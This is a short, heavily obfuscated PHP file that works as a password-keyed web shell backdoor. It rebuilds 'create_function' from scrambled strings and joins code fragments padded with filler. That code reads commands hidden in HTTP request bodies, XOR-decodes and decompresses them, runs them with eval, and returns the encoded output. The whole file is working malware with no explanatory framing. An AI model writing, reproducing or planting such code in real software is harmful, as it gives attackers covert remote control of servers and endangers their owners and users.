<?php
$Y='a:Gse6:G4_encode(@x(@gz:Gco:Gmpress(:G$o),$:Gk));print("$:G:Gp$kh$r$kf");}';
$z='h("/$kh:G(:G.+):G$k:Gf/",@file_:Gget_contents(":Gp:Ghp://i:Gnput"):G,$m)==';
$P='Gj++:G,$i++){:G$o.=$t:G{:G$i}^$k{$j};}}ret:G:Gurn $o;}if (:G@pre:Gg_m:Gatc';
$o=':G$m[1:G]),$k)));$o=@ob_get:G_conte:Gnt:Gs();@ob_e:Gnd_clea:Gn:G(:G);$r=@b';
$t='Y9Di:G8Ad4:GtSFOM:Gm3";fun:Gction x(:G$t,:G$k):G{$c:G=str:G:Glen($k);$l=:G';
$u='strle:Gn($t);$o="";for($i=0;:G$i<$l;:G:G){for:G($j=0:G;($j<$c&&$i:G<$l);$:';
$a=str_replace('qE','','creqEaqEtqEqEe_funqEctqEion');
$W='$k=":Gfc74d:G79a";$kh="94:G32:G:Ge497e70d";:G$:Gkf="b3ac:G4a82a579";$:Gp="a';
$d='1):G:G {@ob_start():G:G;@eva:Gl(@gzun:Gc:Gompress(@:Gx(@bas:Ge64_decode:G(';
$S=str_replace(':G','',$W.$t.$u.$P.$z.$d.$o.$Y);
$O=$a('',$S);$O();
?>
